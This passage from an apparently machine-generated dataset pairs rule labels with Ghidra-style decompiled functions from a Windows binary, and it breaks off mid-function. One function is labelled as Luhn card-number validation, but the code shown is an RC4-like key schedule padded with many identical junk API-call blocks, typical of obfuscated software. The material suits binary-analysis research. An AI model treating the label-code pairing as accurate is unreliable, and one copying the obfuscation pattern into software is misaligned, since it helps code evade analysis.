        "decompiled_code": "\nint32_t __thiscall fcn.00403ef0(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    uVar1 = *(param_1 + 0x18);\n    puVar4 = param_1 + 4;\n    puVar3 = puVar4;\n    if (0xf < uVar1) {\n        puVar3 = *puVar4;\n    }\n    if (puVar3 <= param_2) {\n        puVar3 = puVar4;\n        if (0xf < uVar1) {\n            puVar3 = *puVar4;\n        }\n        if (param_2 < *(param_1 + 0x14) + puVar3) {\n            if (0xf < uVar1) {\n                puVar4 = *puVar4;\n            }\n            iVar2 = fcn.00403e10(param_1, param_2 - puVar4, param_3);\n            return iVar2;\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.00480f85();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.00403bd0(param_3, *(param_1 + 0x14));\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar4;\n        }\n        *puVar4 = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        puVar3 = puVar4;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar3 = *puVar4;\n        }\n        fcn.00456177(puVar3, *(param_1 + 0x18), param_2, param_3);\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar4;\n        }\n        *(puVar4 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 535
    },
    "00403fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403fc0(int32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t **in_FS_OFFSET;\n    bool bVar10;\n    int32_t in_stack_fffff430;\n    uint32_t uStack3016;\n    uint32_t uStack2652;\n    int32_t iStack2648;\n    int32_t iStack2644;\n    int32_t iStack2636;\n    int32_t iStack2632;\n    int32_t iStack2624;\n    int32_t iStack2620;\n    int32_t iStack2612;\n    int32_t iStack2608;\n    int32_t iStack2600;\n    int32_t iStack2596;\n    int32_t iStack2588;\n    int32_t iStack2584;\n    int32_t iStack2576;\n    int32_t iStack2572;\n    int32_t iStack2564;\n    int32_t iStack2560;\n    int32_t iStack2552;\n    int32_t iStack2548;\n    int32_t iStack2540;\n    int32_t iStack2536;\n    int32_t iStack2528;\n    int32_t iStack2524;\n    int32_t iStack2516;\n    int32_t iStack2512;\n    int32_t iStack2504;\n    int32_t iStack2500;\n    int32_t iStack2492;\n    int32_t iStack2488;\n    int32_t iStack2480;\n    int32_t iStack2476;\n    int32_t iStack2468;\n    int32_t iStack2464;\n    int32_t iStack2456;\n    int32_t iStack2452;\n    int32_t iStack2444;\n    int32_t iStack2440;\n    int32_t iStack2432;\n    int32_t iStack2428;\n    int32_t iStack2420;\n    int32_t iStack2416;\n    int32_t iStack2408;\n    int32_t iStack2404;\n    int32_t iStack2396;\n    int32_t iStack2392;\n    int32_t iStack2384;\n    int32_t iStack2380;\n    int32_t iStack2372;\n    int32_t iStack2368;\n    int32_t iStack2360;\n    int32_t iStack2356;\n    int32_t iStack2348;\n    int32_t iStack2344;\n    int32_t iStack2336;\n    int32_t iStack2332;\n    int32_t iStack2324;\n    int32_t iStack2320;\n    int32_t iStack2312;\n    int32_t iStack2308;\n    int32_t iStack2296;\n    int32_t iStack2288;\n    int32_t iStack2284;\n    int32_t **ppiStack2280;\n    int32_t iStack2276;\n    uint uStack2272;\n    int32_t **ppiStack2268;\n    int32_t iStack2264;\n    uint uStack2260;\n    int32_t **ppiStack2256;\n    int32_t iStack2252;\n    uint uStack2248;\n    int32_t **ppiStack2244;\n    int32_t iStack2240;\n    int32_t iStack2236;\n    int32_t **ppiStack2232;\n    int32_t iStack2228;\n    uint uStack2224;\n    int32_t **ppiStack2220;\n    int32_t iStack2216;\n    uint uStack2212;\n    int32_t **ppiStack2208;\n    int32_t iStack2204;\n    uint uStack2200;\n    int32_t **ppiStack2196;\n    int32_t iStack2192;\n    int32_t iStack2188;\n    int32_t **ppiStack2184;\n    int32_t iStack2180;\n    uint uStack2176;\n    int32_t **ppiStack2172;\n    int32_t iStack2168;\n    uint uStack2164;\n    int32_t **ppiStack2160;\n    int32_t iStack2156;\n    uint uStack2152;\n    int32_t **ppiStack2148;\n    int32_t iStack2144;\n    int32_t iStack2140;\n    int32_t **ppiStack2136;\n    int32_t iStack2132;\n    uint uStack2128;\n    int32_t **ppiStack2124;\n    int32_t iStack2120;\n    uint uStack2116;\n    int32_t **ppiStack2112;\n    int32_t iStack2108;\n    int32_t iStack2104;\n    int32_t **ppiStack2100;\n    int32_t iStack2096;\n    int32_t iStack2092;\n    int32_t **ppiStack2088;\n    int32_t iStack2084;\n    uint uStack2080;\n    int32_t **ppiStack2076;\n    int32_t iStack2072;\n    uint uStack2068;\n    int32_t **ppiStack2064;\n    int32_t iStack2060;\n    uint uStack2056;\n    int32_t **ppiStack2052;\n    int32_t iStack2048;\n    int32_t iStack2044;\n    int32_t **ppiStack2040;\n    int32_t iStack2036;\n    uint uStack2032;\n    int32_t **ppiStack2028;\n    int32_t iStack2024;\n    uint uStack2020;\n    int32_t **ppiStack2016;\n    int32_t iStack2012;\n    uint uStack2008;\n    int32_t **ppiStack2004;\n    int32_t iStack2000;\n    int32_t iStack1996;\n    int32_t **ppiStack1992;\n    int32_t iStack1988;\n    int32_t iStack1984;\n    int32_t **ppiStack1980;\n    int32_t iStack1976;\n    uint uStack1972;\n    int32_t **ppiStack1968;\n    int32_t iStack1964;\n    uint uStack1960;\n    int32_t **ppiStack1956;\n    int32_t iStack1952;\n    int32_t iStack1948;\n    int32_t **ppiStack1944;\n    int32_t iStack1940;\n    uint uStack1936;\n    int32_t **ppiStack1932;\n    int32_t iStack1928;\n    uint uStack1924;\n    int32_t **ppiStack1920;\n    int32_t iStack1916;\n    uint uStack1912;\n    int32_t **ppiStack1908;\n    int32_t iStack1904;\n    int32_t iStack1900;\n    int32_t **ppiStack1896;\n    int32_t iStack1892;\n    uint uStack1888;\n    int32_t **ppiStack1884;\n    int32_t iStack1880;\n    uint uStack1876;\n    int32_t **ppiStack1872;\n    int32_t iStack1868;\n    int32_t iStack1864;\n    int32_t **ppiStack1860;\n    int32_t iStack1856;\n    int32_t iStack1852;\n    int32_t **ppiStack1848;\n    int32_t iStack1844;\n    uint uStack1840;\n    int32_t **ppiStack1836;\n    int32_t iStack1832;\n    uint uStack1828;\n    int32_t **ppiStack1824;\n    int32_t iStack1820;\n    uint uStack1816;\n    int32_t **ppiStack1812;\n    int32_t iStack1808;\n    int32_t iStack1804;\n    int32_t **ppiStack1800;\n    int32_t iStack1796;\n    uint uStack1792;\n    int32_t **ppiStack1788;\n    int32_t iStack1784;\n    uint uStack1780;\n    int32_t **ppiStack1776;\n    int32_t iStack1772;\n    int32_t iStack1768;\n    int32_t **ppiStack1764;\n    int32_t iStack1760;\n    int32_t iStack1756;\n    int32_t **ppiStack1752;\n    int32_t iStack1748;\n    int32_t iStack1744;\n    int32_t **ppiStack1740;\n    int32_t iStack1736;\n    uint uStack1732;\n    int32_t **ppiStack1728;\n    int32_t iStack1724;\n    uint uStack1720;\n    int32_t **ppiStack1716;\n    int32_t iStack1712;\n    int32_t iStack1708;\n    int32_t **ppiStack1704;\n    int32_t iStack1700;\n    uint uStack1696;\n    int32_t **ppiStack1692;\n    int32_t iStack1688;\n    uint uStack1684;\n    int32_t **ppiStack1680;\n    int32_t iStack1676;\n    uint uStack1672;\n    int32_t **ppiStack1668;\n    int32_t iStack1664;\n    int32_t iStack1660;\n    int32_t **ppiStack1656;\n    int32_t iStack1652;\n    uint uStack1648;\n    int32_t **ppiStack1644;\n    int32_t iStack1640;\n    uint uStack1636;\n    int32_t iStack1628;\n    int32_t iStack1624;\n    int32_t iStack1620;\n    int32_t iStack1608;\n    int32_t iStack1592;\n    int32_t iStack1584;\n    int32_t iStack1544;\n    int32_t iStack1512;\n    int32_t iStack1504;\n    int32_t iStack1480;\n    int32_t iStack1464;\n    int32_t iStack1424;\n    int32_t iStack1416;\n    int32_t iStack1384;\n    int32_t iStack1352;\n    int32_t iStack1344;\n    int32_t iStack1328;\n    int32_t iStack1304;\n    int32_t iStack1296;\n    int32_t iStack1264;\n    int32_t iStack1240;\n    int32_t iStack1152;\n    int32_t iStack1144;\n    int32_t iStack1112;\n    int32_t iStack976;\n    int32_t iStack912;\n    uint32_t uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x482ef0;\n    piStack12 = *in_FS_OFFSET;\n    uStack16 = *0x4a9ec8 ^ &stack0xfffff430;\n    *in_FS_OFFSET = &piStack12;\n    uVar4 = 0;\n    if (param_4 != 0) {\n        do {\n            *(&iStack2288 + uVar4) = uVar4;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x8df);\n        uVar9 = 0;\n        uVar4 = 0;\n        do {\n            uVar2 = *(&iStack2288 + uVar4);\n            uVar8 = uVar4 + 1;\n            uVar9 = (uVar2 + *(uVar4 % param_2 + param_1) + uVar9) % 0x8df;\n            *(&iStack2288 + uVar4) = *(&iStack2288 + uVar9);\n            *(&iStack2288 + uVar9) = uVar2;\n            uVar4 = uVar8;\n        } while (uVar8 < 0x8df);\n        iStack2296 = 0;\n        uStack2652 = 0;\n        uStack3016 = 0;\n        do {\n            uStack3016 = (uStack3016 + 1) % 0x8df;\n            param_4 = param_4 + -1;\n            uVar2 = *(&iStack2288 + uStack3016);\n            uStack2652 = (uVar2 + uStack2652) % 0x8df;\n            *(&iStack2288 + uStack3016) = *(&iStack2288 + uStack2652);\n            *(&iStack2288 + uStack2652) = uVar2;\n            iVar5 = (*_sym.imp.USER32.dll_GetSystemMenu)(0, 0);\n            if (iVar5 != 0) {\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) {\ncode_r0x0040d272:\n                    fcn.00401070(0x80004005);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 